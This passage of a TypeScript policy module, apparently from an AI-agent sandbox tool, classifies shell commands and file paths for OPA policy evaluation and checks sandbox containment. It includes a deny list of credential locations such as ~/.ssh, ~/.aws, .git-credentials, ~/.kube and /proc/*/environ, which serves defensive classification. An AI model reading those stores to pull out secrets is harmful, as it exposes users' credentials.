import { createHash } from "node:crypto";
import {
  lstatSync as defaultLstatSync,
  readlinkSync as defaultReadlinkSync,
  realpathSync as defaultRealpathSync,
} from "node:fs";
import { dirname, isAbsolute, parse, resolve, sep } from "node:path";
import { z } from "zod";
import { loadPolicy, type LoadedPolicy } from "@open-policy-agent/opa-wasm";
import {
  JsonObject,
  PolicyInput,
  SIDE_EFFECT_TAXONOMY_VERSION,
  aggregateSegments,
  type CompositionEdgeT,
  type CompositionKindT,
  type JsonObjectT,
  type PolicyInputT,
  type PolicyPackRefT,
  type SideEffectSegmentT,
  type SideEffectTargetT,
  type VerdictT,
  type WARDEN_METHODS,
  keelHome as resolveKeelHome,
  searchExecutionScopeFromGlob,
} from "@keel/shared";
import type { PolicyPackSnapshotT } from "./audit/bundle.js";
import { DEFAULT_CAPABILITY_MANIFEST } from "./capability-manifest.js";
import { extractExplicitEgressTarget } from "./egress-review.js";
import { isInside } from "./path-util.js";
import {
  DEFAULT_POLICY_WASM_SHA256,
  defaultPolicyWasmBytes,
} from "./policy/starter-policy-pack-wasm.js";
import type { SandboxProfile, SandboxStatus } from "./sandbox.js";
import {
  parseEditArgs,
  parseReadArgs,
  parseSearchArgs,
  parseWriteArgs,
  resolveRealPathForClassification,
  TypedToolError,
} from "./typed-tools.js";

type ExecuteParams = ReturnType<(typeof WARDEN_METHODS)["warden.execute"]["params"]["parse"]>;
type PolicyExplainParams = ReturnType<
  (typeof WARDEN_METHODS)["warden.policy.explain"]["params"]["parse"]
>;

export const DEFAULT_POLICY_PACK_NAME = "phase2a-starter-policy-pack";
export const DEFAULT_EXPLAIN_SESSION_ID = "ses_01ARZ3NDEKTSV4RRFFQ69G5FAV";

const POLICY_DECISION_ENTRYPOINT = "keel/phase2a/decision";
const ZERO_HASH = `sha256:${"0".repeat(64)}`;

const RawRuleHit = z
  .object({
    ruleId: z.string().min(1),
    guidance: z.string().min(1),
    modifiedArgs: JsonObject.optional(),
  })
  .strict();

const RawPolicyDecision = z
  .object({
    deny: z.array(RawRuleHit),
    review: z.array(RawRuleHit),
    modify: z.array(RawRuleHit),
    warn: z.array(RawRuleHit),
  })
  .strict();

type RawRuleHitT = z.infer<typeof RawRuleHit>;
type RawPolicyDecisionT = z.infer<typeof RawPolicyDecision>;

export interface PolicyDecision {
  readonly verdict: VerdictT;
  readonly matchedRules: readonly string[];
  readonly guidance?: string;
  readonly modifiedArgs?: JsonObjectT;
}

export interface PolicyPort {
  readonly packRef: PolicyPackRefT;
  evaluate(input: PolicyInputT): Promise<PolicyDecision>;
}

export interface PolicyInputBuildOptions {
  readonly workspaceRoot: string;
  readonly env?: NodeJS.ProcessEnv;
  readonly sessionId?: ExecuteParams["sessionId"];
  readonly workspaceTrusted?: boolean;
  readonly sandboxContainment?: SandboxContainmentProof;
  readonly realpath?: (path: string) => string;
  readonly declaredTempRoots?: readonly string[];
  readonly lstat?: (path: string) => { readonly isSymbolicLink: () => boolean };
  readonly readlink?: (path: string) => string;
}

export interface SandboxContainmentProof {
  readonly status: SandboxStatus;
  readonly profile: SandboxProfile;
  readonly requiredDenyReadRoots?: readonly string[];
  readonly workspaceSecretDenyReadComplete?: boolean;
  readonly requiredDenyWriteRoots?: readonly string[];
}

export class PolicyEvaluationError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "PolicyEvaluationError";
  }
}

function sha256(bytes: Uint8Array): string {
  return `sha256:${createHash("sha256").update(bytes).digest("hex")}`;
}

function oneLine(value: string): string {
  let stripped = "";
  for (const char of value) {
    const code = char.codePointAt(0);
    stripped += code !== undefined && (code <= 0x1f || code === 0x7f) ? " " : char;
  }
  return stripped.replace(/\s+/gu, " ").trim();
}

function chooseVerdict(raw: RawPolicyDecisionT): {
  readonly verdict: VerdictT;
  readonly hits: readonly RawRuleHitT[];
} {
  if (raw.deny.length > 0) return { verdict: "deny", hits: raw.deny };
  if (raw.review.length > 0) return { verdict: "review", hits: raw.review };
  if (raw.modify.length > 0) return { verdict: "modify", hits: raw.modify };
  if (raw.warn.length > 0) return { verdict: "warn", hits: raw.warn };
  return { verdict: "allow", hits: [] };
}

export function parsePolicyDecisionResult(resultSet: unknown, entrypoint: string): PolicyDecision {
  const resultArray = z.array(z.unknown()).length(1).safeParse(resultSet);
  if (!resultArray.success) {
    throw new PolicyEvaluationError(
      `policy entrypoint ${entrypoint} returned an invalid result set`,
    );
  }
  const [first] = resultArray.data;
  if (typeof first !== "object" || first === null || !("result" in first)) {
    throw new PolicyEvaluationError(`policy entrypoint ${entrypoint} returned no result`);
  }
  const parsed = RawPolicyDecision.safeParse(first.result);
  if (!parsed.success) {
    throw new PolicyEvaluationError(
      `policy entrypoint ${entrypoint} returned malformed decision: ${parsed.error.issues
        .map((issue) => issue.message)
        .join("; ")}`,
    );
  }
  const selected = chooseVerdict(parsed.data);
  const guidance =
    selected.hits.length === 0
      ? undefined
      : selected.hits.map((hit) => oneLine(hit.guidance)).join("; ");
  const modifiedArgs =
    selected.verdict === "modify"
      ? selected.hits.find((hit) => hit.modifiedArgs !== undefined)
      : undefined;
  if (selected.verdict === "modify" && modifiedArgs?.modifiedArgs === undefined) {
    throw new PolicyEvaluationError("policy modify verdict did not include modifiedArgs");
  }
  return {
    verdict: selected.verdict,
    matchedRules: selected.hits.map((hit) => hit.ruleId),
    ...(guidance === undefined ? {} : { guidance }),
    ...(modifiedArgs?.modifiedArgs === undefined
      ? {}
      : { modifiedArgs: modifiedArgs.modifiedArgs }),
  };
}

class OpaWasmPolicyPort implements PolicyPort {
  readonly packRef: PolicyPackRefT;
  readonly #policy: LoadedPolicy;

  constructor(policy: LoadedPolicy, packRef: PolicyPackRefT) {
    this.#policy = policy;
    this.packRef = packRef;
  }

  async evaluate(input: PolicyInputT): Promise<PolicyDecision> {
    try {
      return parsePolicyDecisionResult(
        this.#policy.evaluate(input, POLICY_DECISION_ENTRYPOINT),
        POLICY_DECISION_ENTRYPOINT,
      );
    } catch (error) {
      if (error instanceof PolicyEvaluationError) throw error;
      const message = error instanceof Error ? error.message : String(error);
      throw new PolicyEvaluationError(`policy evaluation failed: ${message}`);
    }
  }
}

export async function createDefaultPolicyPort(): Promise<PolicyPort> {
  const bytes = defaultPolicyWasmBytes();
  const hash = sha256(bytes);
  if (hash !== DEFAULT_POLICY_WASM_SHA256) {
    throw new PolicyEvaluationError("embedded starter policy pack hash mismatch");
  }
  if (hash === ZERO_HASH) {
    throw new PolicyEvaluationError("embedded starter policy pack hash is zero");
  }
  return new OpaWasmPolicyPort(await loadPolicy(bytes), {
    name: DEFAULT_POLICY_PACK_NAME,
    hash,
  });
}

export function defaultPolicyPackRef(): PolicyPackRefT {
  return {
    name: DEFAULT_POLICY_PACK_NAME,
    hash: DEFAULT_POLICY_WASM_SHA256,
  };
}

/**
 * Snapshot the built-in starter policy pack for an evidence bundle (Epic 2.7). The
 * snapshot's `hash` is the loaded pack's wasm SHA-256 — identical to the
 * `policy.packHash` the gate stamps on records — so the bundle's pack↔records
 * consistency check holds. Only the built-in pack is snapshottable in 2A; broader
 * external-pack snapshots are future work.
 */
export function builtinStarterPackSnapshot(): PolicyPackSnapshotT {
  return {
    name: DEFAULT_POLICY_PACK_NAME,
    hash: DEFAULT_POLICY_WASM_SHA256,
    files: {
      "starter-policy-pack.wasm.base64": Buffer.from(defaultPolicyWasmBytes()).toString("base64"),
    },
  };
}

let defaultPolicyPort: Promise<PolicyPort> | undefined;

export function getDefaultPolicyPort(): Promise<PolicyPort> {
  defaultPolicyPort ??= createDefaultPolicyPort();
  return defaultPolicyPort;
}

function argvFromCommand(command: string): string[] {
  return command
    .trim()
    .split(/\s+/u)
    .filter((part) => part.length > 0);
}

type ShellRelation = "pipe" | "sequence" | "conditional" | "unknown";
type ShellOperator = "pipe" | "sequence" | "and" | "or" | "unknown";
type ShellUnsupportedReason =
  | "background"
  | "comment"
  | "empty_segment"
  | "heredoc"
  | "pattern"
  | "process_substitution"
  | "quote"
  | "shell_expansion";

interface ShellPart {
  readonly text: string;
  readonly operatorToPrevious?: ShellOperator;
}

interface ShellSplit {
  readonly parts: readonly ShellPart[];
  readonly unsupported: boolean;
  readonly unsupportedReasons: readonly ShellUnsupportedReason[];
}

interface ClassifiedShell {
  readonly segments: readonly SideEffectSegmentT[];
  readonly edges: readonly CompositionEdgeT[];
  readonly kind: CompositionKindT;
  readonly targetAwareWrite?: TargetAwareWrite;
}

interface ClassifiedShellPart {
  readonly segments: readonly SideEffectSegmentT[];
  readonly modeledCd: boolean;
  readonly nextDirectory?: string;
  readonly targetAwareWrite?: TargetAwareWrite;
}

interface TargetAwareWrite {
  readonly target: SideEffectTargetT;
  readonly declaredTemp: boolean;
}

interface CdSegmentResult {
  readonly modeled: boolean;
  readonly nextDirectory?: string;
}

function startsShellExpansion(command: string, index: number): boolean {
  const next = command[index + 1];
  return next !== undefined && !/\s/u.test(next);
}

function isInsideUrlToken(command: string, index: number): boolean {
  const tokenStart = Math.max(
    command.lastIndexOf(" ", index),
    command.lastIndexOf("\t", index),
    command.lastIndexOf("\n", index),
    command.lastIndexOf(";", index),
    command.lastIndexOf("|", index),
    command.lastIndexOf("&", index),
  );
  return /\bhttps?:\/\/\S*$/iu.test(command.slice(tokenStart + 1, index + 1));
}

function isShellPatternExpansion(command: string, index: number): boolean {
  const char = command[index];
  if (char !== "*" && char !== "?" && char !== "[" && char !== "{") return false;
  return !isInsideUrlToken(command, index);
}

function unquoteHeredocDelimiter(token: string): string | undefined {
  if (token === "") return undefined;
  if (
    ((token.startsWith("'") && token.endsWith("'")) ||
      (token.startsWith('"') && token.endsWith('"'))) &&
    token.length >= 2
  ) {
    const inner = token.slice(1, -1);
    return inner === "" ? undefined : inner;
  }
  if (/[\s;&|<>]/u.test(token)) return undefined;
  return token;
}

function isSingleOpaqueHeredocCommand(command: string): boolean {
  const normalized = command.trim().replace(/\r\n/gu, "\n").replace(/\r/gu, "\n");
  const matches = [...normalized.matchAll(/<<-?\s*("[^"\n]+"|'[^'\n]+'|[^\s;&|<>]+)/gu)];
  if (matches.length !== 1) return false;
  const match = matches[0]!;
  const operator = match[0];
  const delimiterToken = match[1] ?? "";
  const delimiter = unquoteHeredocDelimiter(delimiterToken);
  if (delimiter === undefined) return false;
  const headerEnd = normalized.indexOf("\n", match.index);
  if (headerEnd === -1) return false;
  const headerTail = normalized.slice(match.index + operator.length, headerEnd).trim();
  if (headerTail !== "") return false;
  const stripsTabs = operator.startsWith("<<-");
  const bodyLines = normalized.slice(headerEnd + 1).split("\n");
  for (let index = 0; index < bodyLines.length; index += 1) {
    const candidate = stripsTabs ? bodyLines[index]!.replace(/^\t+/u, "") : bodyLines[index]!;
    if (candidate !== delimiter) continue;
    const tail = bodyLines
      .slice(index + 1)
      .join("\n")
      .trim();
    return tail === "";
  }
  return false;
}

function splitShellCommand(command: string): ShellSplit {
  const parts: ShellPart[] = [];
  const unsupportedReasons = new Set<ShellUnsupportedReason>();
  let current = "";
  let operatorToPrevious: ShellOperator | undefined;
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;
  let unsupported = false;
  let heredocSeen = false;

  const markUnsupported = (reason: ShellUnsupportedReason): void => {
    unsupported = true;
    unsupportedReasons.add(reason);
  };

  const pushCurrent = (nextOperator: ShellOperator): void => {
    const text = current.trim();
    if (text === "") {
      markUnsupported("empty_segment");
    } else {
      parts.push({ text, ...(operatorToPrevious === undefined ? {} : { operatorToPrevious }) });
    }
    current = "";
    operatorToPrevious = nextOperator;
  };

  for (let i = 0; i < command.length; i++) {
    const char = command[i]!;
    const next = command[i + 1];

    if (escaped) {
      if (char === "\n" || char === "\r") {
        markUnsupported("quote");
        current += char;
        if (char === "\r" && next === "\n") {
          current += next;
          i += 1;
        }
        escaped = false;
        continue;
      }
      current += char;
      escaped = false;
      continue;
    }
    if (char === "\\") {
      current += char;
      escaped = true;
      continue;
    }
    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      current += char;
      continue;
    }
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      current += char;
      continue;
    }
    if (inSingleQuote) {
      current += char;
      continue;
    }
    if (inDoubleQuote) {
      if (char === "`") markUnsupported("shell_expansion");
      if (char === "$" && startsShellExpansion(command, i)) markUnsupported("shell_expansion");
      current += char;
      continue;
    }

    if (!heredocSeen && (char === "\n" || char === "\r")) {
      pushCurrent("sequence");
      if (char === "\r" && next === "\n") i += 1;
      continue;
    }

    if (char === "#") markUnsupported("comment");
    if (char === "`") markUnsupported("shell_expansion");
    if (char === "$" && startsShellExpansion(command, i)) markUnsupported("shell_expansion");
    if (isShellPatternExpansion(command, i)) markUnsupported("pattern");
    if ((char === "<" || char === ">") && next === "(") markUnsupported("process_substitution");
    if (char === "<" && next === "<") {
      markUnsupported("heredoc");
      heredocSeen = true;
    }

    if (char === "&") {
      if (next === "&") {
        pushCurrent("and");
        i += 1;
      } else {
        markUnsupported("background");
        current += char;
      }
      continue;
    }
    if (char === "|") {
      if (next === "|") {
        pushCurrent("or");
        i += 1;
      } else {
        pushCurrent("pipe");
      }
      continue;
    }
    if (char === ";") {
      pushCurrent("sequence");
      continue;
    }

    current += char;
  }

  if (inSingleQuote || inDoubleQuote || escaped) markUnsupported("quote");
  const trailing = current.trim();
  if (trailing !== "") {
    parts.push({
      text: trailing,
      ...(operatorToPrevious === undefined ? {} : { operatorToPrevious }),
    });
  } else if (parts.length === 0) {
    markUnsupported("empty_segment");
  }

  return {
    parts: parts.length === 0 ? [{ text: command.trim() }] : parts,
    unsupported,
    unsupportedReasons: [...unsupportedReasons],
  };
}

function homeRoot(env: NodeJS.ProcessEnv): string {
  const home = env["HOME"];
  return home === undefined || home === "" ? "/home/unknown" : home;
}

function workspaceDotenvDenyRoots(workspaceRoot: string): string[] {
  return [".env", ".env.local", ".env.development", ".env.production", ".env.test"].map((name) =>
    resolve(workspaceRoot, name),
  );
}

function homeSecretDenyRoots(env: NodeJS.ProcessEnv): string[] {
  const home = homeRoot(env);
  return [
    resolve(home, ".ssh"),
    resolve(home, ".aws"),
    resolve(home, ".gnupg"),
    resolve(home, ".netrc"),
    resolve(home, ".npmrc"),
  ];
}

// Delegates to the canonical, cross-process resolution (P1-11) so the deny-write roots that protect
// keel's audit/policy dirs are computed for the SAME directory the kernel writes state to.
function wardenKeelHome(env: NodeJS.ProcessEnv): string {
  return resolveKeelHome(env);
}

function keelOwnedDenyWriteRoots(env: NodeJS.ProcessEnv, proof: SandboxContainmentProof): string[] {
  const keelHome = wardenKeelHome(env);
  return [
    resolve(keelHome, "audit"),
    resolve(keelHome, "policy"),
    keelHome,
    ...uniqueResolved(proof.requiredDenyWriteRoots),
  ];
}

function normalizePathTarget(rawPath: string, basePath: string, env: NodeJS.ProcessEnv): string {
  if (rawPath === "~") return homeRoot(env);
  if (rawPath.startsWith("~/")) return resolve(homeRoot(env), rawPath.slice(2));
  if (isAbsolute(rawPath)) return resolve(rawPath);
  return resolve(basePath, rawPath);
}

function rawPathMentionsDotEnvNamespace(rawPath: string): boolean {
  const normalized = rawPath.replace(/\\/gu, "/");
  return /(^|[/{,])\.env/u.test(normalized) || /(^|[/{,])\.\{[^}]*\benv\b/u.test(normalized);
}

function secretPath(rawPath: string, normalized: string, env: NodeJS.ProcessEnv): boolean {
  const home = homeRoot(env);
  return (
    rawPathMentionsDotEnvNamespace(rawPath) ||
    normalized.includes(`${sep}.env`) ||
    // Any process's environ, incl. the per-thread `/proc/<pid>/task/<tid>/environ` (QC: the plain
    // `/proc/self/environ` form was too narrow — a thread's environ holds the same secrets).
    /^\/proc\/[^/]+(\/task\/[^/]+)?\/environ$/u.test(normalized) ||
    isInside(resolve(home, ".ssh"), normalized) ||
    isInside(resolve(home, ".aws"), normalized) ||
    isInside(resolve(home, ".gnupg"), normalized) ||
    normalized === resolve(home, ".netrc") ||
    normalized === resolve(home, ".npmrc") ||
    // QC §1 (must-fix): common developer credential stores. Kept in lockstep with the sandbox
    // `home_secret_roots` denyRead token in capability-manifest.ts — change both together.
    normalized === resolve(home, ".git-credentials") ||
    normalized === resolve(home, ".pypirc") ||
    normalized === resolve(home, ".dockercfg") ||
    isInside(resolve(home, ".docker"), normalized) ||
    isInside(resolve(home, ".kube"), normalized) ||
    isInside(resolve(home, ".config", "gh"), normalized) ||
    isInside(resolve(home, ".config", "gcloud"), normalized)
  );
}

function pathScope(normalized: string, workspaceRoot: string, env: NodeJS.ProcessEnv) {
  if (isInside(workspaceRoot, normalized)) return "workspace" as const;
  if (isInside(homeRoot(env), normalized)) return "home" as const;
  if (isInside("/tmp", normalized) || isInside("/private/tmp", normalized)) return "temp" as const;
  return "system" as const;
}

function pathTarget(
  rawPath: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): SideEffectTargetT {
  const normalized = normalizePathTarget(rawPath, basePath, env);
  return {
    kind: "path",
    value: rawPath,
    normalized,
    withinWorkspace: isInside(workspaceRoot, normalized),
    sensitivity: secretPath(rawPath, normalized, env) ? "secret" : "internal",
  };
}

const EXACT_TOUCH_COMMAND_RE = /^touch ([A-Za-z0-9_./][A-Za-z0-9_./+-]*)$/u;
const MAX_TOUCH_SYMLINKS = 40;
const MAX_TOUCH_PATH_STEPS = 4_096;
// Target-aware classification is a convenience above the structural sandbox, not a reason to
// spend unbounded CPU on a hostile 1 MiB RPC frame. This is four times Linux PATH_MAX and well
// above macOS PATH_MAX; longer operands retain the existing generic review path.
const MAX_TOUCH_PATH_LENGTH = 16_384;

function exactTouchOperand(command: string): string | undefined {
  const match = EXACT_TOUCH_COMMAND_RE.exec(command);
  return match !== null && match[0].length === command.length ? match[1] : undefined;
}

function filesystemErrorCode(error: unknown): string | undefined {
  if (typeof error !== "object" || error === null || !("code" in error)) return undefined;
  return typeof error.code === "string" ? error.code : undefined;
}

function splitRawAbsolutePath(path: string): {
  readonly root: string;
  readonly components: string[];
} {
  const root = parse(path).root || sep;
  const components = path.slice(root.length).split(sep);
  if (components.length > MAX_TOUCH_PATH_STEPS) {
    throw new Error("touch path component limit exceeded");
  }
  return { root, components };
}

function rawAbsolutePath(rawPath: string, basePath: string, env: NodeJS.ProcessEnv): string {
  const expanded =
    rawPath === "~"
      ? homeRoot(env)
      : rawPath.startsWith("~/")
        ? `${homeRoot(env)}${sep}${rawPath.slice(2)}`
        : rawPath;
  if (isAbsolute(expanded)) return expanded;
  return `${basePath.endsWith(sep) ? basePath : `${basePath}${sep}`}${expanded}`;
}

/**
 * Resolves symlink components even when the final referent does not exist. This is intentionally
 * limited to the exact target-aware `touch PATH` form: broad migration of the transitional Bash
 * classifier would change unrelated authority. Every filesystem dependency is injected for
 * adversarial tests, and callers collapse every failure to the existing generic review route.
 */
function resolveTouchPath(
  rawPath: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  filesystem: {
    readonly lstat: (path: string) => { readonly isSymbolicLink: () => boolean };
    readonly readlink: (path: string) => string;
  },
): string {
  if (rawPath.length > MAX_TOUCH_PATH_LENGTH) {
    throw new Error("touch path length limit exceeded");
  }
  const initial = splitRawAbsolutePath(rawAbsolutePath(rawPath, basePath, env));
  let current = initial.root;
  const frames: Array<{ readonly components: readonly string[]; index: number }> = [
    { components: initial.components, index: 0 },
  ];
  let symlinks = 0;
  let steps = 0;

  const nextComponent = (): string | undefined => {
    for (;;) {
      const frame = frames.at(-1);
      if (frame === undefined) return undefined;
      if (frame.index >= frame.components.length) {
        frames.pop();
        continue;
      }
      const component = frame.components[frame.index];
      frame.index += 1;
      return component;
    }
  };

  const countStep = (): void => {
    steps += 1;
    if (steps > MAX_TOUCH_PATH_STEPS) throw new Error("touch path resolution exhausted");
  };

  for (;;) {
    const component = nextComponent();
    if (component === undefined) return current;
    countStep();
    if (component === "" || component === ".") continue;
    if (component === "..") {
      current = dirname(current);
      continue;
    }

    const candidate = resolve(current, component);
    let stat: { readonly isSymbolicLink: () => boolean };
    try {
      stat = filesystem.lstat(candidate);
    } catch (error) {
      const code = filesystemErrorCode(error);
      if (code !== "ENOENT" && code !== "ENOTDIR") throw error;
      const missingTail: string[] = [];
      for (;;) {
        const tail = nextComponent();
        if (tail === undefined) break;
        countStep();
        if (tail === "" || tail === ".") continue;
        // A missing component followed by `..` cannot be traversed by the kernel. Do not invent a
        // target for a command that cannot reach one; retain generic review instead.
        if (tail === "..") throw new Error("touch path has indeterminate missing parent");
        missingTail.push(tail);
      }
      return missingTail.length === 0 ? candidate : resolve(candidate, missingTail.join(sep));
    }

    if (!stat.isSymbolicLink()) {
      current = candidate;
      continue;
    }

    symlinks += 1;
    if (symlinks > MAX_TOUCH_SYMLINKS) throw new Error("touch symlink traversal exhausted");
    const referent = filesystem.readlink(candidate);
    if (referent.length > MAX_TOUCH_PATH_LENGTH) {
      throw new Error("touch symlink referent length limit exceeded");
    }
    if (isAbsolute(referent)) {
      const absolute = splitRawAbsolutePath(referent);
      current = absolute.root;
      frames.push({ components: absolute.components, index: 0 });
    } else {
      current = dirname(candidate);
      const components = referent.split(sep);
      if (components.length > MAX_TOUCH_PATH_STEPS) {
        throw new Error("touch symlink component limit exceeded");
      }
      frames.push({ components, index: 0 });
    }
  }
}

function targetAwareTouchWrite(
  rawPath: string,
  basePath: string,
  options: {
    readonly workspaceRoot: string;
    readonly env: NodeJS.ProcessEnv;
    readonly workspaceTrusted: boolean;
    readonly declaredTempRoots: readonly string[];
    readonly lstat?: (path: string) => { readonly isSymbolicLink: () => boolean };
    readonly readlink?: (path: string) => string;
  },
): TargetAwareWrite | undefined {
  if (!options.workspaceTrusted) return undefined;
  const filesystem = {
    lstat: options.lstat ?? defaultLstatSync,
    readlink: options.readlink ?? defaultReadlinkSync,
  };
  try {
    const resolvedTarget = resolveTouchPath(rawPath, basePath, options.env, filesystem);
    const resolvedWorkspace = resolveTouchPath(
      options.workspaceRoot,
      options.workspaceRoot,
      options.env,
      filesystem,
    );
    const resolvedDeclaredRoots = options.declaredTempRoots.flatMap((root) => {
      try {
        return [resolveTouchPath(root, options.workspaceRoot, options.env, filesystem)];
      } catch {
        return [];
      }
    });
    return {
      target: {
        kind: "path",
        value: rawPath,
        normalized: resolvedTarget,
        withinWorkspace: isInside(resolvedWorkspace, resolvedTarget),
        sensitivity: secretPath(rawPath, resolvedTarget, options.env) ? "secret" : "internal",
      },
      declaredTemp: resolvedDeclaredRoots.some((root) => isInside(root, resolvedTarget)),
    };
  } catch {
    return undefined;
  }
}

function destructivePathTarget(
  rawPath: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot: string,
  options: { readonly workspaceTrusted: boolean; readonly realpath?: (path: string) => string },
): SideEffectTargetT {
  const lexical = normalizePathTarget(rawPath, basePath, env);
  if (!options.workspaceTrusted) return pathTarget(rawPath, basePath, env, workspaceRoot);
  const realpath = options.realpath ?? defaultRealpathSync;
  const resolvedTarget = resolveRealPathForClassification(lexical, realpath);
  const resolvedWorkspaceRoot = resolveRealPathForClassification(resolve(workspaceRoot), realpath);
  const withinWorkspace = isInside(resolvedWorkspaceRoot, resolvedTarget);
  return {
    kind: "path",
    value: rawPath,
    normalized: withinWorkspace ? lexical : resolvedTarget,
    withinWorkspace,
    sensitivity: secretPath(rawPath, resolvedTarget, env) ? "secret" : "internal",
  };
}

function typedPathTarget(
  rawPath: string,
  options: PolicyInputBuildOptions,
  env: NodeJS.ProcessEnv,
): SideEffectTargetT {
  if (rawPath.includes("\0")) {
    throw new TypedToolError("INVALID_PARAMS", "invalid path: path may not contain a NUL byte");
  }
  const lexical = normalizePathTarget(rawPath, options.workspaceRoot, env);
  const realpath = options.realpath ?? defaultRealpathSync;
  let resolvedTarget: string;
  let resolvedWorkspaceRoot: string;
  try {
    resolvedTarget =
      options.workspaceTrusted === true
        ? resolveRealPathForClassification(lexical, realpath)
        : lexical;
    resolvedWorkspaceRoot =
      options.workspaceTrusted === true
        ? resolveRealPathForClassification(resolve(options.workspaceRoot), realpath)
        : options.workspaceRoot;
  } catch {
    throw new TypedToolError(
      "INVALID_PARAMS",
      "invalid path: cannot resolve path for policy classification",
    );
  }
  const withinWorkspace = isInside(resolvedWorkspaceRoot, resolvedTarget);
  // Preserve the lexical spelling for contained targets so it remains comparable with the sandbox
  // profile's declared roots (notably macOS /var -> /private/var aliases). Outside targets retain the
  // resolved spelling so the signed audit record describes the actual escape destination.
  const normalized = withinWorkspace ? lexical : resolvedTarget;
  return {
    kind: "path",
    value: rawPath,
    normalized,
    withinWorkspace,
    sensitivity: secretPath(rawPath, resolvedTarget, env) ? "secret" : "internal",
  };
}

function untrustedTypedPathTarget(
  rawPath: string,
  options: PolicyInputBuildOptions,
  env: NodeJS.ProcessEnv,
): SideEffectTargetT {
  const safeRawPath = oneLine(rawPath);
  return pathTarget(safeRawPath.length > 0 ? safeRawPath : ".", options.workspaceRoot, env);
}

function typedPathScope(target: SideEffectTargetT, workspaceRoot: string, env: NodeJS.ProcessEnv) {
  return target.withinWorkspace === true
    ? ("workspace" as const)
    : pathScope(target.normalized!, workspaceRoot, env);
}

function commandTarget(command: string): SideEffectTargetT {
  return { kind: "command", value: command, normalized: command };
}

function hostTarget(host: string): SideEffectTargetT {
  return { kind: "host", value: host, normalized: host };
}

function packageTarget(name: string): SideEffectTargetT {
  return { kind: "package", value: name, normalized: name };
}

function envTarget(name: string): SideEffectTargetT {
  return { kind: "env_var", value: name, normalized: name, sensitivity: "secret" };
}

function uniqueResolved(paths: readonly string[] | undefined): string[] {
  return [...new Set((paths ?? []).map((path) => resolve(path)))];
}

function isTempRoot(path: string): boolean {
  return isInside("/tmp", path) || isInside("/private/tmp", path);
}

function rootsContainedToWorkspaceOrTemp(
  roots: readonly string[] | undefined,
  workspaceRoot: string,
): boolean {
  const normalized = uniqueResolved(roots);
  return (
    normalized.length > 0 &&
    normalized.every((root) => isInside(workspaceRoot, root) || isTempRoot(root))
  );
}

function rootsContainAll(
  roots: readonly string[] | undefined,
  required: readonly string[],
): boolean {
  const normalized = uniqueResolved(roots);
  return required.every((entry) => normalized.some((root) => isInside(root, entry)));
}

function networkBlocksAllEgress(profile: SandboxProfile): boolean {
  return (
    profile.network?.strictAllowlist === true &&
    (profile.network.allowedDomains ?? []).length === 0 &&
    (profile.network.deniedDomains ?? []).includes("*")
  );
}

function sandboxProofIsContained(
  proof: SandboxContainmentProof,
  options: { readonly workspaceRoot: string; readonly env: NodeJS.ProcessEnv },
): boolean {
  if (!proof.status.available || !proof.status.enforcementTier.startsWith("sandbox:")) return false;
  const filesystem = proof.profile.filesystem;
  if (filesystem === undefined) return false;
  return (
    rootsContainedToWorkspaceOrTemp(filesystem.allowRead, options.workspaceRoot) &&
    rootsContainedToWorkspaceOrTemp(filesystem.allowWrite, options.workspaceRoot) &&
    proof.workspaceSecretDenyReadComplete === true &&
    rootsContainAll(filesystem.denyRead, [
      ...homeSecretDenyRoots(options.env),
      ...workspaceDotenvDenyRoots(options.workspaceRoot),
      ...uniqueResolved(proof.requiredDenyReadRoots),
    ]) &&
    rootsContainAll(filesystem.denyWrite, keelOwnedDenyWriteRoots(options.env, proof)) &&
    networkBlocksAllEgress(proof.profile)
  );
}

function sandboxExtension(
  proof: SandboxContainmentProof | undefined,
  options: {
    readonly workspaceRoot: string;
    readonly env: NodeJS.ProcessEnv;
    readonly arbitraryCode: boolean;
    readonly workspaceTrusted: boolean;
  },
): JsonObjectT | undefined {
  if (!options.workspaceTrusted) return undefined;
  if (!options.arbitraryCode || proof === undefined) return undefined;
  if (!sandboxProofIsContained(proof, options)) return undefined;
  return {
    "keel.sandbox": {
      containedArbitraryCode: true,
      backend: proof.status.backend,
      enforcementTier: proof.status.enforcementTier,
      filesystem: {
        allowRead: uniqueResolved(proof.profile.filesystem?.allowRead),
        allowWrite: uniqueResolved(proof.profile.filesystem?.allowWrite),
        denyRead: uniqueResolved(proof.profile.filesystem?.denyRead),
        denyWrite: uniqueResolved(proof.profile.filesystem?.denyWrite),
      },
      network: {
        allowedDomains: [...(proof.profile.network?.allowedDomains ?? [])],
        deniedDomains: [...(proof.profile.network?.deniedDomains ?? [])],
        strictAllowlist: proof.profile.network?.strictAllowlist === true,
      },
    },
  };
}

function staticCapabilityForTool(toolName: string) {
  const tool = DEFAULT_CAPABILITY_MANIFEST.tools.find((entry) => entry.toolName === toolName);
  if (tool === undefined) {
    throw new PolicyEvaluationError(`no static capability manifest entry for tool: ${toolName}`);
  }
  return tool.staticCapability;
}

function segment(input: SideEffectSegmentT): SideEffectSegmentT {
  return input;
}

const SHELL_LEAD_TRIM = "<'\"`";
const SHELL_TRAIL_TRIM = ")'\"`;\\";

// Linear leading/trailing trim. This was two regexes; the trailing `[…]+$` backtracks O(n²) on a long
// run of class chars that does not end the string — a control-plane ReDoS reachable from an unbounded
// governed-bash token (QC-2026-07-11 round-3 #4: a 200k-char operand hung classification ~72s). The
// character classes are preserved exactly (leading `< ' " \``; trailing `) ' " \` ; \`).
function stripShellPathToken(token: string): string {
  let start = 0;
  let end = token.length;
  while (start < end && SHELL_LEAD_TRIM.includes(token[start]!)) start += 1;
  while (end > start && SHELL_TRAIL_TRIM.includes(token[end - 1]!)) end -= 1;
  return start === 0 && end === token.length ? token : token.slice(start, end);
}

function pathTokens(fragment: string): string[] {
  const result: string[] = [];
  for (const raw of fragment.trim().split(/\s+/u)) {
    if (raw === "" || raw === "--") continue;
    if (raw.startsWith(">") || raw.startsWith("<")) break;
    if (raw.startsWith("-")) continue;
    const token = stripShellPathToken(raw);
    if (token !== "") result.push(token);
  }
  return result;
}

// File-reading verbs whose positional operands are file PATHS, so a secret path among them is
// classified as an fs_read and POL-001 can deny it structurally — not just for `cat`. Pattern-first
// and option-heavy utilities are modeled by command-specific parsers below so regex/program operands
